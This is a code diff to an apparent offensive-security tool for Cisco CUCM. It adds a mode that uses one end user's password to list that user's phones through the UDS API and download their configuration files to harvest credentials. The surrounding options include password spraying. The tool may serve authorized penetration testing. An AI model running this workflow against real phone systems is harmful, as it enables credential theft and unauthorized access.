@@ -2372,6 +2372,12 @@ def main():
     parser.add_argument('--servers', action='store_true', default=False, help='Enumerate the CUCM cluster topology via UDS /cucm-uds/servers (requires -H)')
     parser.add_argument('--http', action='store_true', default=False, help='Use HTTP (port 6970) as the primary download protocol, with TFTP fallback (default: TFTP first, HTTP fallback)')
     parser.add_argument('--uds-port', type=int, default=UDS_PORT, help=f'CUCM UDS API HTTPS port for --userenum (default: {UDS_PORT})')
+    parser.add_argument('--uds-devices', action='store_true', default=False,
+                        help='Discover SEP devices associated with a single end user via authenticated UDS, then download + parse their configs (requires -H, --uds-user, --uds-password; no admin privileges needed)')
+    parser.add_argument('--uds-user', type=str, default=None,
+                        help='End-user username for --uds-devices authentication')
+    parser.add_argument('--uds-password', type=str, default=None,
+                        help='End-user password for --uds-devices authentication')
     # Password spray (UDS Basic Auth against /cucm-uds/user/{userid})
     parser.add_argument('--spray', action='store_true', default=False,
                         help='Password-spray the UDS API (requires -H; mutually exclusive with --brute-mac)')
@@ -2647,6 +2653,41 @@ def main():
                     print(f'[-] No device associations returned unauthenticated')
         else:
             print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
+        quit(0)
+
+    if args.uds_devices:
+        if not CUCM_host:
+            print('--uds-devices requires -H/--host to specify the CUCM server')
+            quit(1)
+        if not args.uds_user or not args.uds_password:
+            print('--uds-devices requires both --uds-user and --uds-password')
+            quit(1)
+
+        print(f'Discovering devices for user {args.uds_user!r} via '
+              f'https://{CUCM_host}:{args.uds_port}/cucm-uds/user/{args.uds_user}')
+        status, devices = get_user_devices_authenticated(
+            CUCM_host, args.uds_user, args.uds_password, port=args.uds_port,
+        )
+        if status == 'unauthorized':
+            print(f'[-] UDS rejected credentials for {args.uds_user!r} (HTTP 401)')
+            quit(1)
+        if status == 'error':
+            print(f'[-] Could not query UDS devices for {args.uds_user!r} (run with -d for details)')
+            quit(1)
+        if not devices:
+            print(f'[-] Authenticated successfully, but no devices are associated with {args.uds_user!r}')
+            quit(0)
+
+        print(f'[+] Discovered {len(devices)} device(s):')
+        for device_name in devices:
+            print(f'    {device_name}')
+            if not no_db:
+                log_uds_device(CUCM_host, args.uds_user, device_name, 'uds_devices', db_file)
+
+        hits = download_uds_discovered_configs(
+            CUCM_host, devices, db_file, use_tftp=use_tftp, no_db=no_db,
+        )
+        print(f'[+] Config download complete: {hits}/{len(devices)} configs yielded credentials')
         quit(0)
 
     if args.spray:
